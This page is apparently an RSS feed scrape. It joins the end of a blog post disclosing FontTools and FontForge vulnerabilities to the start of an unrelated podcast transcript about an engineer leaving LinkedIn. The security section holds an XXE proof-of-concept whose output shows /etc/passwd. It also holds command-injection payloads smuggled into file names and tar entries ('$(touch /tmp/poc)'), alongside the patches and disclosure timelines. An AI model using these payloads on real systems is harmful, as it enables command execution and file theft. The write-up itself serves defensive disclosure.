<div><pre><p><span>pyftsubset poc-payload.ttf --output-file</span><span>=</span><span>"poc-payload.subset.ttf"</span><span> </span><span>--unicodes</span><span>=</span><span>"*"</span><span> --ignore-missing-glyphs </span><span>\</span><span></span></p><p><span>ttx </span><span>-t</span><span> SVG poc-payload.subset.ttf </span><span>&amp;&amp;</span><span> </span><span>cat</span><span> poc-payload.subset.ttx</span></p></pre></div>
<div><pre><p><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span></span></p><p><span></span><span>&lt;</span><span>ttFont</span><span> </span><span>sfntVersion</span><span>=</span><span>"</span><span>\x00\x01\x00\x00</span><span>"</span><span> </span><span>ttLibVersion</span><span>=</span><span>"</span><span>4.42</span><span>"</span><span>&gt;</span><span></span></p><p><span>  </span><span>&lt;</span><span>SVG</span><span>&gt;</span><span></span></p><p><span>    </span><span>&lt;</span><span>svgDoc</span><span> </span><span>endGlyphID</span><span>=</span><span>"</span><span>12</span><span>"</span><span> </span><span>startGlyphID</span><span>=</span><span>"</span><span>1</span><span>"</span><span>&gt;</span><span></span></p><p><span>      &lt;![CDATA[</span><span>&lt;</span><span>svg</span><span> </span><span>xmlns</span><span>=</span><span>"</span><span>http://www.w3.org/2000/svg</span><span>"</span><span> </span><span>xmlns:</span><span>xlink</span><span>=</span><span>"</span><span>http://www.w3.org/1999/xlink</span><span>"</span><span>&gt;</span><span>&lt;</span><span>g</span><span> </span><span>id</span><span>=</span><span>"</span><span>glyph1</span><span>"</span><span>&gt;</span><span>&lt;</span><span>text</span><span> </span><span>font-size</span><span>=</span><span>"</span><span>10</span><span>"</span><span> </span><span>x</span><span>=</span><span>"</span><span>0</span><span>"</span><span> </span><span>y</span><span>=</span><span>"</span><span>10</span><span>"</span><span>&gt;</span><span>##</span></p><p><span># User Database</span></p><p><span>#</span></p><p><span># Note that this file is consulted directly only when the system is running</span></p><p><span># in single-user mode.  At other times this information is provided by</span></p><p><span># Open Directory.</span></p><p><span>#</span></p><p><span># See the opendirectoryd(8) man page for additional information about</span></p><p><span># Open Directory.</span></p><p><span>##</span></p><p><span>nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false</span></p></pre></div>
<h3 id="patch-and-timeline">Patch and timeline</h3>
<p>Following responsible disclosure, the maintainers were swift to implement <a target="_new" href="https://github.com/fonttools/fonttools/commit/9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c">a patch</a>,
which disabled entity resolution (that is, <code>XMLParser(resolve_entities=False)</code>),
shortly followed by <a target="_new" href="https://github.com/fonttools/fonttools/releases/tag/4.43.0">a release</a>
including the fix.</p>
<ul>
<li>September 13, 2023: Reported issue to FontTools maintainers.</li>
<li>September 16, 2023: FontTools maintainers release a patch.</li>
<li>October 12, 2023: CVE issued by GitHub.</li>
<li>January 09, 2024: Advisory published by the maintainers.</li>
</ul>
<h2 id="font-collections-and-esoteric-font-naming-conventions">Font collections and esoteric font naming conventions</h2>
<p>Historically, for size reduction, it was desirable to pack multiple fonts
(of the same or different formats) into one file. To do this, they established
the TrueType Collection (TTC) and Suitcase font formats.</p>
<p><span><span></span><img alt="true type collections illustration" loading="lazy" width="1632" height="747" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/ttf-collections.e3515484.png"><span></span></span></p>
<p>To handle these formats, font software authors developed esoteric naming
conventions as a convenience mechanism for users to work with such files.</p>
<p>Tools like FontForge and ImageMagick adopted the naming convention of using parentheses after the filename (for example, <code>Alef-Regular.dfont(1)</code>) to allow users to specify the desired font inside the collection to edit. FontForge refers to such files collectively as ‘subfonts’.</p>
<p>This is noteworthy because it highlights the need to preserve the filename, which can lead to security challenges when operating on the untrusted data</p>
<h2 id="orand-zip-cve-2024-25081"><code>:(){ :|:&amp; };:.zip</code> - CVE-2024-25081</h2>
<p>When FontForge attempts to handle archive files, based on the input files extension, it attempts to solve the problem of extracting the files from the archive by leveraging the cross-platform <code>system()</code> libc API. Ordinarily, this could be okay because the only user-controlled data would be the filename, which could be sanitized.
However, preserving the original filename can be crucial to support working with subfonts.</p>
<p>Therefore, when assembling the command string for the archive list command the original filename is used, leading to a command injection vulnerability.</p>
<div><pre><p><span>listcommand </span><span>=</span><span> </span><span>malloc</span><span>(</span><span> </span><span>strlen</span><span>(</span><span>archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>unarchive</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span> </span><span>+</span><span></span></p><p><span>                      </span><span>strlen</span><span>(</span><span> archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>listargs</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span> </span><span>+</span><span></span></p><p><span>                      </span><span>strlen</span><span>(</span><span> name </span><span>)</span><span> </span><span>+</span><span> </span><span>3</span><span> </span><span>+</span><span></span></p><p><span>                      </span><span>strlen</span><span>(</span><span> listfile </span><span>)</span><span> </span><span>+</span><span>4</span><span> </span><span>)</span><span>;</span><span></span></p><p><span></span><span>sprintf</span><span>(</span><span> listcommand</span><span>,</span><span></span></p><p><span>        </span><span>"%s %s %s &gt; %s"</span><span>,</span><span></span></p><p><span>        archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>unarchive</span><span>,</span><span></span></p><p><span>        archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>listargs</span><span>,</span><span></span></p><p><span>        name</span><span>,</span><span></span></p><p><span>        listfile </span><span>)</span><span>;</span><span></span></p><p><span></span><span>if</span><span> </span><span>(</span><span> </span><span>system</span><span>(</span><span>listcommand</span><span>)</span><span>!=</span><span>0</span><span> </span><span>)</span><span> </span><span>{</span><span></span></p><p><span></span><span>}</span></p></pre></div>
<h3 id="proof-of-concept-2"><a name="poc"></a>Proof of concept</h3>
<p>Knowing that a filename with an archive extension will make its way to this sink, we can construct a simple proof of concept to demonstrate shell execution by including shell escape or subshell tokens in the filename.</p>
<div><pre><p><span>touch</span><span> archive.zip</span><span>\</span><span>;</span><span>id</span><span>\</span><span>;</span><span>.zip</span></p></pre></div>
<p>When supplied to Fontforge’s <code>Open()</code> procedure, the <code>id</code> command result is printed to <code>stdout</code>.</p>
<div><pre><p><span>fontforge </span><span>-lang</span><span>=</span><span>ff </span><span>-c</span><span> </span><span>'Open($1);'</span><span> archive.zip</span><span>\</span><span>;</span><span>id</span><span>\</span><span>;</span><span>.zip /tmp/zip.ttf</span></p></pre></div>
<div><pre><p><span>Copyright </span><span>(</span><span>c</span><span>)</span><span> </span><span>2000</span><span>-2024. See AUTHORS </span><span>for</span><span> Contributors.</span></p><p><span>sh: </span><span>1</span><span>: unzip: not found</span></p><p><span></span><span>uid</span><span>=</span><span>0</span><span>(</span><span>root</span><span>)</span><span> </span><span>gid</span><span>=</span><span>0</span><span>(</span><span>root</span><span>)</span><span> </span><span>groups</span><span>=</span><span>0</span><span>(</span><span>root</span><span>)</span><span></span></p><p><span>sh: </span><span>1</span><span>: .zip: not found</span></p></pre></div>
<h3 id="patch-and-timeline-2"><a name="timeline"></a>Patch and timeline</h3>
<p>After liaising with the FontForge maintainers, we submitted a <a target="_new" href="https://github.com/fontforge/fontforge/pull/5367">patch</a> we developed, which was later merged by the maintainers.</p>

<ul>
<li>
<p>January 19, 2024: Reported issue to FontForge maintainers.</p>
</li>
<li>
<p>February 6, 2024: Raised a pull request for the patch and merged it into the FontForge main branch.</p>
</li>
</ul>
<h2 id="compressed-fonts">Compressed fonts</h2>
<p>Font compression is a popular choice for web fonts because it can reduce the amount of data downloaded by clients and improve web page responsiveness. WOFF and WOFF2 (font types developed for the web) were specifically designed to use compression, with WOFF using ZLIB and WOFF2 using Brotli (which offers a 30% reduction in file size).</p>
<p>However, other font formats (such as TTF) don’t natively support compression and file sizes can be quite large. There are ways to remedy this, for example, Google Fonts lets you dynamically subset a font to only what you need, <a target="_new" href="https://developers.google.com/fonts/docs/getting_started#optimizing_your_font_requests">gaining up to a 90% reduction in file size</a>.</p>
<p>Because of font compression, it’s popular for fonts to be distributed as archive files, for both the compression aspects and for bundling many font families together. Tools like FontForge now include support for dealing with archive files. Some tools can even reach into the archive file and modify files in situ (such as <code>exiftools</code>), however, FontForge extracts the fonts first into a temporary directory to work on them.</p>
<h2 id="font-tartare-cve-2024-25082">Font tartare - CVE-2024-25082</h2>
<p>A vulnerability was discovered when FontForge parses the Table of Contents (TOC) for an archive file. The TOC is a list of all the files compressed in the archive and FontForge uses this to pull a font file out to perform actions on.</p>
<p>The filename comes from the <code>ArchiveParseTOC</code> function, which means we can create an archive <em>containing</em> a malicious filename, bypassing traditional filename sanitization techniques, and triggering our exploit. As stated previously, filenames are important when dealing with fonts and this is another example of why it can be tricky to sanitize them.</p>
<div><pre><p><span>desiredfile </span><span>=</span><span> </span><span>ArchiveParseTOC</span><span>(</span><span>listfile</span><span>,</span><span> archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>ars</span><span>,</span><span> </span><span>&amp;</span><span>doall</span><span>)</span><span>;</span><span></span></p><p><span>unarchivecmd </span><span>=</span><span> </span><span>malloc</span><span>(</span><span>strlen</span><span>(</span><span>archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>unarchive</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span> </span><span>+</span><span></span></p><p><span>                      </span><span>strlen</span><span>(</span><span> archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>listargs</span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span> </span><span>+</span><span></span></p><p><span>                      </span><span>strlen</span><span>(</span><span> name </span><span>)</span><span> </span><span>+</span><span> </span><span>1</span><span> </span><span>+</span><span></span></p><p><span>                      </span><span>strlen</span><span>(</span><span> desiredfile </span><span>)</span><span> </span><span>+</span><span> </span><span>3</span><span> </span><span>+</span><span></span></p><p><span>                      </span><span>strlen</span><span>(</span><span> archivedir </span><span>)</span><span> </span><span>+</span><span> </span><span>30</span><span> </span><span>)</span><span>;</span><span></span></p><p><span></span><span>sprintf</span><span>(</span><span>unarchivecmd</span><span>,</span><span></span></p><p><span>        </span><span>"( cd %s ; %s %s %s %s ) &gt; /dev/null"</span><span>,</span><span></span></p><p><span>        archivedir</span><span>,</span><span></span></p><p><span>        archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>unarchive</span><span>,</span><span></span></p><p><span>        archivers</span><span>[</span><span>i</span><span>]</span><span>.</span><span>extractargs</span><span>,</span><span></span></p><p><span>        name</span><span>,</span><span></span></p><p><span>        doall </span><span>?</span><span> </span><span>""</span><span> </span><span>:</span><span> desiredfile </span><span>)</span><span>;</span><span></span></p><p><span></span><span>if</span><span> </span><span>(</span><span> </span><span>system</span><span>(</span><span>unarchivecmd</span><span>)</span><span>!=</span><span>0</span><span> </span><span>)</span><span> </span><span>{</span><span></span></p><p><span></span><span>}</span></p></pre></div>
<p>Using this, it’s possible to get command injection in FontForge, either running in server mode or in the desktop application.</p>
<h3 id="proof-of-concept-3">Proof of concept</h3>
<p>Knowing that FontForge unsafely handles the first filename in an archive, we were able to craft a malicious payload containing system commands to be executed. The POC script below generates a <code>.tar</code> archive file with our exploit as the first file.</p>
<div><pre><p><span></span><span>import</span><span> tarfile</span></p><p><span></span><span>import</span><span> os</span></p><p><span>exec_command </span><span>=</span><span> </span><span>f"$(touch /tmp/poc)"</span><span></span></p><p><span></span><span>with</span><span> tarfile</span><span>.</span><span>open</span><span>(</span><span>"poc.tar"</span><span>,</span><span> </span><span>"w"</span><span>,</span><span> </span><span>format</span><span>=</span><span>tarfile</span><span>.</span><span>USTAR_FORMAT</span><span>)</span><span> </span><span>as</span><span> t</span><span>:</span><span></span></p><p><span>    t</span><span>.</span><span>addfile</span><span>(</span><span>tarfile</span><span>.</span><span>TarInfo</span><span>(</span><span>exec_command</span><span>)</span><span>)</span></p></pre></div>
<p>Using the <code>tar tf poc.tar</code> command, we can list all of the files in the archive.</p>
<div><pre><p><span>$ </span><span>tar</span><span> tf poc.tar</span></p><p><span></span><span>$(</span><span>touch</span><span> /tmp/poc</span><span>)</span><span></span></p><p><span>$ </span><span>cat</span><span> poc.tar</span></p><p><span></span><span>$(</span><span>touch</span><span> /tmp/poc</span><span>)</span><span>0000644000000000000000000000000000000000000010606 0ustar00</span></p></pre></div>
<p>Similar to <a href="https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/#poc">CVE-2024-25081</a> we can open the file with FontForge and observe that our exploit triggers. Whether the file is opened through the CLI or GUI makes no difference (except for operating system-specific commands).</p>
<h3 id="patch-and-timeline-3">Patch and timeline</h3>
<p>The patch involved converting all of the <code>system()</code> calls with <a target="_new" href="https://docs.gtk.org/glib/func.spawn_sync.html">g_spawn_sync</a> or <a target="_new" href="https://docs.gtk.org/glib/func.spawn_async.html">g_spawn_async</a> functions because the GLIB spawn calls don’t run in a shell environment. Doing it this way, we can safely execute system commands.</p>
<div><pre><p><span>-</span><span>    snprintf( buf, sizeof(buf), "%s &lt; %s &gt; %s", compressors[compression].decomp, name, tmpfn );</span></p><p><span></span><span>-</span><span>    if ( system(buf)==0 )</span></p><p><span></span><span>-</span><span> return( tmpfn );</span></p><p><span></span><span>-</span><span>    free(tmpfn);</span></p><p><span></span><span>-</span><span> return( NULL );</span></p><p><span></span><span>+</span><span>    command[0] = compressors[compression].decomp;</span></p><p><span></span><span>+</span><span>    command[1] = "-c";</span></p><p><span></span><span>+</span><span>    command[2] = name;</span></p><p><span></span><span>+</span><span>    command[3] = NULL;</span></p><p><span></span><span>+</span><span></span></p><p><span></span><span>+</span><span>    if (!g_spawn_async_with_pipes(</span></p><p><span></span><span>+</span><span>      NULL,</span></p><p><span></span><span>+</span><span>      command,</span></p><p><span></span><span>+</span><span>      NULL,</span></p><p><span></span><span>+</span><span>      G_SPAWN_DO_NOT_REAP_CHILD | G_SPAWN_SEARCH_PATH,</span></p><p><span></span><span>+</span><span>      NULL,</span></p><p><span></span><span>+</span><span>      NULL,</span></p><p><span></span><span>+</span><span>      NULL,</span></p><p><span></span><span>+</span><span>      NULL,</span></p><p><span></span><span>+</span><span>      &amp;stdout_pipe,</span></p><p><span></span><span>+</span><span>      NULL,</span></p><p><span></span><span>+</span><span>      NULL)) {</span></p><p><span></span><span>+</span><span>      //command has failed</span></p><p><span></span><span>+</span><span>      return( NULL );</span></p><p><span></span><span>+</span><span>    }</span></p><p><span></span><span>+</span><span></span></p><p><span></span><span>+</span><span>    // Read from the pipe.</span></p><p><span></span><span>+</span><span>    while ((bytes_read = read(stdout_pipe, buffer, sizeof(buffer))) &gt; 0) {</span></p><p><span></span><span>+</span><span>        g_byte_array_append(binary_data, (guint8 *)buffer, bytes_read);</span></p><p><span></span><span>+</span><span>    }</span></p><p><span></span><span>+</span><span>    close(stdout_pipe);</span></p><p><span></span><span>+</span><span></span></p><p><span></span><span>+</span><span>    FILE *fp = fopen(tmpfn, "wb");</span></p><p><span></span><span>+</span><span>    fwrite(binary_data-&gt;data, sizeof(gchar), binary_data-&gt;len, fp);</span></p><p><span></span><span>+</span><span>    fclose(fp);</span></p><p><span></span><span>+</span><span>    g_byte_array_free(binary_data, TRUE);</span></p></pre></div>
<p>The timeline corresponds to that of <a href="https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/#timeline">CVE-2024-25081</a>.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Fonts are complicated and safely handling them is a difficult problem to solve.
You should treat fonts like any other untrusted input:</p>
<ul>
<li>Implement sandboxing for anything that processes fonts.</li>
<li>Employ tools like <a target="_new" href="https://github.com/khaledhosny/ots">OpenType-Sanitizer</a>.</li>
</ul>
<p>It can be difficult for maintainers to handle security problems, so having
security engineers provide patching can speed up the process and build
rapport with the open source community. We’d like to thank all the maintainers
of open source font software and tools for their hard work. Finally, we hope to
see more font security research in the future because we believe it’s an area
still lacking in security maturity.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Leaving LinkedIn: Choosing Engineering Excellence over Expediency (380 pts)]]></title>
            <link>https://corecursive.com/leaving-linkedin-with-chris-krycho/</link>
            <guid>39612443</guid>
            <pubDate>Wed, 06 Mar 2024 04:49:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://corecursive.com/leaving-linkedin-with-chris-krycho/">https://corecursive.com/leaving-linkedin-with-chris-krycho/</a>, See on <a href="https://news.ycombinator.com/item?id=39612443">Hacker News</a></p>
<div id="readability-page-1" class="page"><p><i>Note: This podcast is designed to be heard. If you are able, we strongly encourage you to listen to the
audio, which includes emphasis that’s not on the page</i></p><div>
<h2 id="intro">Intro</h2>
<p><strong>Adam:</strong>
Hello, and welcome to CoRecursive. I’m Adam Gordon Bell. Imagine that you’re at the forefront of shaping the front end for the world’s largest professional social network with like a billion users, LinkedIn, only to find yourself at a crossroads where your core values are just clashing with the demands of the job.</p>

<p>Today, we’re diving into the story of a senior staff engineer at LinkedIn who faced a real dilemma. And if you’re a loyal listener, you might recognize the guest.</p>
<p><strong>Chris:</strong>
There we go. Okay, those are running now. Crap. Did I screw up my ability to hear you?</p>
<p><strong>Adam:</strong>
Hello, hello, hello?</p>
<p><strong>Chris:</strong>
I did. Dang it. Hang on.</p>
<p><strong>Adam:</strong>
Hello, hello?</p>
<p><strong>Chris:</strong>
Yeah, yeah, we’re good now. Okay. Let’s try that again.</p>
<p><strong>Adam:</strong>
That’s Chris Krycho, and he was on the podcast some time ago talking about TypeScript. Today, though, he’s talking about his time at LinkedIn.</p>
<p><strong>Chris:</strong>
I loved my time at LinkedIn. It was great. And I’m really excited for where it takes me next, because I couldn’t do whatever it is I do next without that, including the bumpy parts, but also the really bright parts.</p>

<p>You know, you could come away from that whole difficult ending to the story thinking, wow, LinkedIn really sucked for Chris, but no, actually in the main, it was really great and I’m really glad of it. And even that bumpy ending, I’m glad of the lessons I learned and looking forward to where it takes me next.</p>
<p><strong>Adam:</strong>
So, yeah, about that bumpy ending. Chris worked at LinkedIn in a pretty important and senior role for close to five years. And he oversaw a bunch of important projects in the desktop app, what you see when you go to LinkedIn.com and in a non-mobile browser, that he worked on that. He led projects like modernizing just massive loads of JavaScript,</p>

<p>But let’s cut to the chase. Chris quit LinkedIn. And he quit out of frustration. That’s the story we’re going to unpack today. What it’s like to have a senior technical role at a place with thousands of devs. Right, how do you get big initiatives coordinating across many teams?</p>

<p>How do you get things like that done? How do you lead big projects? How do you improve a massive code base? Also, how do you balance sustainable development practices with a business need for speed? What if this thirst for velocity and speed of iteration clashes with your approach, and your values, and how you think things should be done?</p>

<p>How do you handle that conflict? And spoiler alert, it ends with Chris walking away from the job. That’s what we’re talking about today. But yeah, it all started in Sunnyvale.</p>
<h2 id="first-days-at-linkedin"><strong>First Days At LinkedIn</strong></h2>
<p><strong>Chris:</strong>
It was almost exactly five years ago now. I started. The last days of January, 2019, which feels like a lot more than five years ago. Thanks COVID. But, uh, when I first got there, when you join a big company or good, healthy, small companies, there’s usually some variety of onboarding. So I spent a lot of time going through the onboarding classes, learning how all the different layers of the stack worked and all of that.</p>
<p><strong>Adam:</strong>
Chris was going to be working remotely from Colorado once he got going, but the first two weeks were onboarding, and the second of those two weeks was spending time with his team,</p>
<p><strong>Chris:</strong>
You know, sitting next to and chatting with people on my team, my manager, and a couple of the folks I, I worked with.</p>

<p>Even then, that team was a bit more distributed than most. So we had a couple people who worked in that little corner of cubicle land in the Sunnyvale office, and we had a couple people who lived in a corner of cubicle land in the SF office, and then we had one person working from Alaska, and then we had me, Actually working from Colorado remotely, which was very unusual for LinkedIn at the time we had, I think, under 100 engineers remote when I joined and thousands of engineers total.</p>
<p><strong>Adam:</strong>
For Chris, working at such a place was a big change.</p>
<h2 id="millions-of-lines-of-code"><strong>Millions of Lines of Code</strong></h2>
<p><strong>Chris:</strong>
The startup I’d been coming from had a relatively standard, relatively well-factored monolith backend, and then, you know, database and a handful of services here and there. And I got to LinkedIn and discovered, okay, number one, there are more people working on the front end client app that are employed by my previous employer. And there are more lines of code in this client app than exist at my previous employer in total. And there are thousands of services running in the backend and these monstrous API servers which absolutely dwarf anything we had at my previous employer, but that that’s just the API server for one and this is just the client you think of as LinkedIn.com and oh, by the way, we also have our ad selling platform. And oh, by the way, we also have LinkedIn Learning. And oh, by the way, we also and just the list goes on and on. And so one of the really strong, striking experiences was just repeatedly over and over again saying I’m I’m sorry, did you say insert number here?</p>

<p>My previous company had what I thought at the time was a pretty decent sized app, like 150,000 lines of code. And the LinkedIn front end, when I got there had 2 million, it’s just like, I’m, did you say million? Uh, that’s, that’s a lot.</p>

<p>That’s 20 times almost the size of my, how, how do you even build that? How long to build? Oh, 17 minutes for a new build. That’s, that’s not bad. We should probably make that better, but that’s not bad.</p>
<h2 id="infrastructure-team"><strong>Infrastructure Team</strong></h2>
<p><strong>Adam:</strong>
Chris’s team was called the Infrastructure Team, but this didn’t mean standing up servers. It was more like engineering enablement or developer experience. Chris’s job was to make the front end of LinkedIn’s massive desktop app easier to work on. And that’s well, well that’s a lot.</p>
<p><strong>Chris:</strong>
What does it mean to be serving and to some extent helping lead somewhere between 150 to 200 engineers committing to this app every quarter, uh, shipping more and more and more lines of code, just how do, how do you do anything at that scale where there are dozens of teams, hundreds of engineers trying to ship one cohesive product? Just kind of overwhelming at first the scale of all of that exciting also to be very clear It wasn’t like I was like, oh no, it was more like this is cool. But oh my gosh, there’s how do we do what and also then? You know you think about tech debt or tech success either one But at that scale all of those successes and problems are very much magnified.</p>

<p>So you’re like, oh We have two million lines worth of tech debt like whatever your tech debt problems are It’s multiplied by that rather than, you know, whatever your baseline is. And that’s, it’s a lot.</p>
<h2 id="js-modernization"><strong>JS Modernization</strong></h2>
<p><strong>Adam:</strong>
One of the first big changes that Chris helped with was introducing JavaScript classes. JavaScript had introduced classes, but they were using Ember, the framework, and their code needed some careful updating.</p>
<p><strong>Chris:</strong>
So how do we get 2 million lines of code to change how they author classes from, you know, pass an object literal into a function to, okay, now we’re going to use class foo extends subclass bar or superclass bar.</p>

<p>So that kind of thing was like, okay, we, we have code mods. But they’re not a hundred percent and there are complicated things about like, okay, if you take a native class from JavaScript and use it as a subclass of an old school Ember class? And then that is a subclass of a native class, so it’s kind of striped.</p>

<p>We, we came up with the fun name Zebra Striping for that. Like, if your classes look like a series of zebra stripes where some of them are white and some of them are black, think of that as, you know, old school classes versus modern JavaScript classes all the way along down. There were interrupt bugs because the, the old system was never designed to work with this.</p>

<p>And that gets it maybe one of the biggest pieces that I learned there.

Is for a migration to work at that kind of scale it, it has to be as automatable as possible because otherwise it’ll, it’ll just never get done because the amount of work it would take to manually rewrite 2 million lines of code, it’s just going to take months and months of work, even if you could work on it full time and.</p>

<p>It’s totally unreasonable to ask a product team to stop work full time to go get some nice new syntax for their JavaScript. Even if it comes with performance benefits, even if it comes from end user experience benefits,</p>
<p><strong>Adam:</strong>
Oh, right. The product teams. Right. Chris’s team works on ways to improve developer experience, but they need everyone else on board. They need the product teams that are busy shipping features to help.</p>
<p><strong>Chris:</strong>
LinkedIn has a number of relatively well baked processes, always undergoing some degree of revision, but a number of well baked processes for. Wrangling large technical investments, and that dates back to when LinkedIn hit a scaling cliff on its monolith in the early 2010s and just had to go into a service oriented architecture, early microservices.</p>

<p>Mode because it just it could not scale a single monolith anymore at the point It was at and that was a tenth of the size that the user base is now and so on So they basically had to stop work for a year and they looked at that and you know I say stop work stop product work and they said we’re never we’re never gonna do this again It’s too expensive as a business to stop all work for a year.</p>

<p>And so we had a system For horizontal initiatives like that, and that’s what they were called, where horizontal meaning kind of cutting across large numbers of teams and you had to pitch them. There’s a committee that reviews them for the whole company and keeps the level of engagement there at a, you know.</p>

<p>10 percent of these teams commitment or lower so that you can just say, we’re not, we’re not going to spend 100 percent of all of the product teams working on the flagship app on your technical initiative.</p>
<p><strong>Adam:</strong>
Keeping it under 10 percent was tough, so the plan was to use a lot of automation and tooling to speed things up.</p>

<p>But first, they needed a green light from a senior VP, so they crafted a pitch.</p>
<p><strong>Chris:</strong>
So try to fit all of the wins and trade offs and how that makes business value sense and what the actual, what the technical outcomes are and what the then business outcomes are from those technical outcomes in one page. As an aside, LinkedIn had a hilarious culture of one pagers that were like three to six pages long.</p>
<p><strong>Adam:</strong>
are you saying you made a tool and then the specific teams kind of run the tool with the human in the loop and make sure, like,</p>
<p><strong>Chris:</strong>
Yes exactly, right now we also learned from some of those early phases that if If we didn’t have to get those specific teams to do it and we could do it for them. That was also better Because it’s a lot easier for a team to say. Yes I will review your prs and do a smoke test to make sure everything’s good Then it is to get them to sign up to say I will take a You know, a half a week or a week of my product shipping time to do these code mods.</p>

<p>If instead I can just say, Hey, I’ve got this automation. I’m going to run it on your code base. Here’s some training. So, you know, what the output is going to look like and how to work with it. And can you merge my PRs? Much easier, much easier to get buy in from them and especially their management than saying, Hey, can you do some work for us, please?</p>

<p>It took us 18 months end to end to do the Ember stuff. Uh, most of it was in a six month period, but you always have a long tail of teams that Ah, sorry, we have to delay this for two quarters. And another team that gets hit by, well, we would like to fund this, but actually the CEO himself just vetoed our attempted rollout of a new product design.</p>

<p>And we’re going to have to rebuild it from scratch. And sorry, when you go up against the CEO, you’ll lose. So your technical initiative, it’s important. We agree, but no, you can’t have that. Or the CEO wins.</p>
<h2 id="typescript"><strong>TypeScript</strong></h2>
<p><strong>Adam:</strong>
After that project’s success, Chris and his team had a clear next target. It was the flood of errors being generated in the front end.</p>
<p><strong>Chris:</strong>
Like most companies, LinkedIn has error logging for those kinds of things. Most, you know, your startup probably uses a ray gun or something like that to ingest those. LinkedIn has its own internal infrastructure because the prices for the levels of errors we were filing every, every hour would be exorbitant.</p>
<p><strong>Adam:</strong>
that’s wild. I guess there’s like an implication that there’s a lot of like maybe secondary code paths that are just broken. Uh, and that’s surprising to me.</p>
<p><strong>Chris:</strong>
I mean, I guess my snarky take is it shouldn’t be. It really shouldn’t be. It’s like, I mean, to make it a little less snarky and to really speak earnestly about this. When I look at software, a lot of software is bad. Broken in those ways and it’s not generally due to a lack of care on the part of engineers it’s usually down to a combination of structural factors of at least two sorts Sort one is what I think many of us are familiar with just in the form of business pressures of look We’ve got a ship this thing and in a lot of ways, that’s a really good forcing function Motivated engineers are often inclined to polishing for too long, and sometimes we just need to get the thing out into the world.</p>

<p>And that’s again, not necessarily.</p>

<p>bad, but it can mean that we cut corners and we compromise on quality and without a very strong and robust engineering culture that understands, yes, that’s a valuable trade off to make, but no, we can’t make it all the time or we’ll end up with ultimately Broken, janky user experiences that in the short term may not hurt us, but in the long term will actually hurt us as a business.</p>

<p>Even when you’re doing your best, you end up with code that is often subtly broken. So your smoke test might not catch it. Your attempt at QA might not catch it. It might be in an obscure path, but when you’ve got LinkedIn cross the billion members count sometime this past year.</p>

<p>Well, a billion members touching what by the time I left was the 3. 2 million lines of code in this mono repo, half of which is tests and half of which is production code. But like, it doesn’t matter how hard you have tried QA wise. There’s just going to be stuff that somebody thinks to do that. No one ever thought of that particular pathway in combination of stuff to test.</p>

<p>And so you end up with something that’s broken and maybe the page hangs, maybe it white screens on you, you know, somebody reloads</p>

<p>it or. in an app on a mobile device, they just kill the app and restart it and try to do it again. And well, we all know that turn it off and turn it on again, fixes a lot of problems because you get in out of those weird state bugs.</p>
<p><strong>Adam:</strong>
But there was a solution though. If you took those issues one by one and just imagined that instead you have been using TypeScript.</p>
<p><strong>Chris:</strong>
So one of the things we did is go and look at, okay, what’s our actual count of JavaScript errors that we know would be caught by this? There are some that you’re never going to catch.</p>

<p>TypeScript is complicated, JavaScript is complicated, but there were classes of errors that we could say, Look, if we actually do the whole migration, how many of these things will stop going to our logging infrastructure? And when you’re looking at a number that’s in the millions per day, you start to actually be able to talk real numbers of, hey, we could cut our logging volume from the application down by at least a quarter.</p>

<p>Uh, just get rid of 25%. The number’s probably higher than that. That’s a floor.</p>
<h2 id="typescript-buy-in"><strong>TypeScript Buy In</strong></h2>
<p><strong>Adam:</strong>
So, Chris starts putting together a one pager on moving to TypeScript. The good news is, migrating to TypeScript can be done incrementally.</p>

<p>Lots of codebases have done it before. The bad news is, there’s no way it can fit in a 10 percent time budget. It’s just too large of a task.</p>

<p>But Chris’s document was convincing. TypeScript used to have this slogan, JavaScript that scales.</p>

<p>And with those millions of lines of code, with all of those errors, and going through them, it was pretty clear that LinkedIn needed those scaling benefits. And so, Chris skipped the horizontal initiatives, he, he sort of went grassroots, went bottom up.</p>
<p><strong>Chris:</strong>
Engineering managers would ask engineers on their team, okay, you’re advocating that we be early adopters for this, or that we make a significant investment here.</p>

<p>Why? That document would just get handed to them. And so it became a really useful tool to just have the information available in a relatively concise format that said, here are the problems it solves. Here are the wins it gives us. Here’s how it stacks up even in our hiring ability to compete with our peers who are trying to hire.</p>

<p>And then people could fit that into their mental box of here’s what the tool is. Here’s what it gives us. Here’s how that competes against other priorities. Okay. Yeah, this makes sense. And with that in place, then those conversations about prioritization of it versus other things became a lot easier. I think it became a lot easier for anybody to say, No, this, this is worthwhile. Okay, I get it.</p>
<p><strong>Adam:</strong>
That’s, yeah, that’s powerful. It’s like you’re like, Oh, I just told them something that was obviously true, and then people had to do it.</p>
<p><strong>Chris:</strong>
Yeah. Yeah, that’s right.</p>
<p><strong>Adam:</strong>
So, TypeScript takes off. And Chris becomes the go to guy for tough typing problems, need help with a tricky bit of TypeScripting, call Chris. But with this new free time, with this project underway, the next big issue lands on his desk. And this is where things start to spiral a little bit.</p>

<p>LinkedIn was the biggest user of EmberJS in the world. But they weren’t super thrilled about it. And it was a conflict. Chris felt it too. He was an open source Ember team member, a contributor. But at LinkedIn, as the DX guy, he saw a lot of mismatches.</p>
<p><strong>Chris:</strong>
But long story short, we ended up in a spot where my job a year and a half ago was figure out a plan to get us off of Ember and onto React.</p>

